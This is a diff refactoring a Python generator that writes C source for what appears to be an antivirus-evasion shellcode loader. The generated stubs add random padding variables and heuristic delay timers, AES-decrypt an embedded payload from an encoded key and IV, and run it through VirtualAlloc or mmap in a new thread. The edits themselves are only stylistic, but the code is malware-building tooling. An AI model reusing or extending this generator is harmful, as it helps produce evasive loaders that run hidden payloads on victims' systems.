@@ -4,8 +4,7 @@ Create the various code segments for the C program
 
 # Add headers
 def cHeaders():
-  headers = ""
-  headers += "#define _CRT_SECURE_NO_DEPRECATE\n"
+  headers = "" + "#define _CRT_SECURE_NO_DEPRECATE\n"
   headers += "#define _CRT_SECURE_NO_WARNINGS\n"
   headers += "#define CRYPTOPP_DEFAULT_NO_DLL\n"
   headers += "#define CRYPTOPP_ENABLE_NAMESPACE_WEAK 1\n"
@@ -35,10 +34,12 @@ def cHeaders():
   return headers
 
 def execHeaderStub(execFunc, execParam):
-  execStub = ""
-  execStub += "#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)\n"
+  execStub = (
+      "" +
+      "#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)\n"
+  )
   execStub += "#include <windows.h>\n"
-  execStub += "DWORD WINAPI " + execFunc + "(LPVOID " + execParam + ");\n"
+  execStub += f"DWORD WINAPI {execFunc}(LPVOID {execParam}" + ");\n"
   execStub += "#else\n"
   execStub += "#include <sys/mman.h>\n"
   execStub += "#include <sys/wait.h>\n"
@@ -54,7 +55,8 @@ def randVarsAndData(paddingVars, genVar, genData):
 
   # Loop through random values, set random padding variables and initialize their values
   while paddingLoop < paddingVars:
-    paddingPayload += 'unsigned char ' + genVar() + str(paddingLoop) + '[]="' + genData() + '";\n'
+    paddingPayload += (
+        f'unsigned char {genVar()}{paddingLoop}' + '[]="' + genData() + '";\n')
     paddingLoop += 1
 
   return paddingPayload
@@ -125,7 +127,8 @@ def delayTime(heuristicFunc, heuristicTimer, diffieDelay, diffieFunc, currentTim
 
 # int main()
 def mainStub(st, timerFunc, decrypted, encodedKey, key, encodedIv, iv, decodedCipher, ssp, aespayload, aesDecryption, cbcDecryption, stfDecryptor, virtAllocFuncVar):
-  mainVar = ("""int _tmain(int argc, _TCHAR* argv[])
+  return (
+      """int _tmain(int argc, _TCHAR* argv[])
 {
   clock_t %(st)s = clock();
   %(timerFunc)s(%(st)s);
@@ -150,12 +153,12 @@ def mainStub(st, timerFunc, decrypted, encodedKey, key, encodedIv, iv, decodedCi
   %(virtAllocFuncVar)s(%(decrypted)s);
 
   exit(0);
-}\n""" % locals())
-
-  return mainVar
+}\n"""
+      % locals())
 
 def virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, len, pid, code, addr, page_size, execFuncVar, execParamVar):
-  virtualAllocVar = ("""int %(virtAllocFuncVar)s(std::string %(virtAllocFuncParam)s)
+  return (
+      """int %(virtAllocFuncVar)s(std::string %(virtAllocFuncParam)s)
 {
   size_t %(len)s;
 
@@ -232,6 +235,5 @@ DWORD WINAPI %(execFuncVar)s(LPVOID %(execParamVar)s)
   return 0;
 }
 #endif
-\n""" % locals())
-
-  return virtualAllocVar
+\n"""
+      % locals())
